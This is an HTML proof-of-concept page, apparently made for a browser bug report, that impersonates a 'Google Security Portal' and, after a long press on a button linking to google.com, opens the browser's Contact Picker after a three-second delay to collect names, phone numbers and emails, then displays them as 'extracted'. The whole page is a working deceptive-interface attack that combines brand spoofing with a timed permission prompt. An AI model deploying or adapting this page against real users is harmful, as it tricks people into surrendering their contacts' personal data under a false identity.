<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Preview Page & Contact Picker Escalation PoC</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        h1 {
            font-size: 20px;
            color: #1a73e8;
            margin-bottom: 24px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #1a73e8;
            color: white;
            padding: 14px 28px;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
            transition: background-color 0.2s;
        }
        a.spoof-link:active {
            background-color: #1557b0;
        }
        .info-box {
            margin-top: 25px;
            max-width: 320px;
            width: 100%;
            background: #ffffff;
            border: 1px solid #dadce0;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
            font-size: 13px;
            color: #5f6368;
            word-break: break-all;
            display: none;
            text-align: left;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 11px;
            color: #9aa0a6;
        }
        .pulse {
            color: #34a853;
            font-weight: bold;
            animation: blink 1.5s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.4; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>

    <div class="banner">Google Security Portal</div>
    <h1>Preview Page & Contact Picker Escalation</h1>

    <!-- Target Link dengan Preview Page (target="_blank") -->
    <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="targetLink">Long Press -> Preview Page & Contact Picker</a>

    <!-- Kotak Informasi penampil status & hasil ekstraksi kontak -->
    <div class="info-box" id="infoBox">
        <strong>Status:</strong> <span id="statusText" class="pulse">Waiting for interaction...</span><br>
        <div id="contactDetails" style="margin-top: 8px;"></div>
    </div>

    <div class="footer-note">Cloud-secured verification system.</div>

    <script>
        document.addEventListener("contextmenu", async (e) => {
            const infoBox = document.getElementById("infoBox");
            const statusText = document.getElementById("statusText");
            const contactDetails = document.getElementById("contactDetails");

            infoBox.style.display = "block";
            statusText.className = "pulse";
            statusText.innerText = "Triggering preview page & awaiting contact permission...";

            setTimeout(async () => {
                try {
                    // Memeriksa dukungan properti Contact Picker API
                    if (navigator.contacts && navigator.contacts.getProperties) {
                        const supportedProps = await navigator.contacts.getProperties();
                        if (supportedProps.includes('name') && supportedProps.includes('tel')) {
                            // Memanggil dialog pemilih kontak sistem
                            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                            
                            statusText.className = "";
                            if (contacts && contacts.length > 0) {
                                statusText.innerText = `Successfully Extracted ${contacts.length} Contact(s)!`;
                                let listHTML = "<b>Selected Contacts:</b><br>";
                                contacts.forEach((c, idx) => {
                                    const name = c.name ? c.name.join(', ') : 'No Name';
                                    const tel = c.tel ? c.tel.join(', ') : 'No Phone';
                                    const email = c.email ? c.email.join(', ') : 'No Email';
                                    listHTML += `[${idx+1}] ${name} | ${tel} | ${email}<br>`;
                                });
                                contactDetails.innerHTML = listHTML;
                            } else {
                                statusText.innerText = "Contact selection cancelled.";
                                contactDetails.innerHTML = "";
                            }
                        } else {
                            statusText.className = "";
                            statusText.innerText = "Contact properties (name/tel) not supported.";
                        }
                    } else {
                        statusText.className = "";
                        statusText.innerText = "Contact Picker API is not supported on this browser/environment.";
                    }
                } catch (err) {
                    statusText.className = "";
                    statusText.innerText = `Picker error / blocked: ${err.message}`;
                }
            }, 3000); // Jeda 3 detik sesuai logika asli Anda
        });
    </script>

</body>
</html>
